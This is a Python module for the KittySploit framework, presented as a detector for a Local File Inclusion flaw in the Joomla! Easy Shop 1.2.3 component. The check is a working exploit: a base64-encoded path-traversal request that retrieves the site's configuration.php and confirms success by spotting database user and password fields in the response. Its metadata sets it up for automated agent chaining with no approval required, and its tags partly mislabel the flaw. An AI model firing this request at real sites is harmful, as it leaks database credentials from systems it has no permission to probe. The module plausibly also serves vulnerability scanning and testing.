#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Joomla! component Easy Shop version 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Component Easy Shop 1.2.3 - Local File Inclusion Detection',
        'description': 'The Joomla! component Easy Shop version 1.2.3 is vulnerable to Local File Inclusion (LFI) attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'cnvd', 'cnvd2023', 'file-upload', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://blog.csdn.net/weixin_42628854/article/details/136036109'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('$user', '$password', '$dbtype',)
        body_all = ('<?php', 'class JConfig {',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Joomla! Component Easy Shop 1.2.3 - Local File Inclusion detected",
                path='/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=',
            )
            return True
        return False

